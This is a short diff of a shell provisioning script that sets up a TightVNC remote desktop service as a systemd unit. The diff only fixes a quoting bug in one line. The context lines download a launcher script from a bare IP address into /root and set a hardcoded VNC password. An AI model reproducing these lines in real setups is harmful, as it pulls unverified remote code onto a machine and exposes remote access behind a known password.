@@ -21,7 +21,7 @@ wget http://64.227.19.44/content/dlj23jjoj233jjajdeqo/launcher.sh -O /root/launc
 printf "dh?w2qa3\ndh?w2qa3\n\n" | vncpasswd -f
 echo '[Unit]' > /etc/systemd/system/tightvncserver.service
 echo 'Description=TightVNC remote desktop server' >> /etc/systemd/system/tightvncserver.service
-echo \n' >> /etc/systemd/system/tightvncserver.service
+printf '\n' >> /etc/systemd/system/tightvncserver.service
 echo '[Service]' >> /etc/systemd/system/tightvncserver.service
 echo 'Type=dbus' >>  /etc/systemd/system/tightvncserver.service
 echo 'ExecStart=/usr/bin/tightvncserver :1' >>  /etc/systemd/system/tightvncserver.service
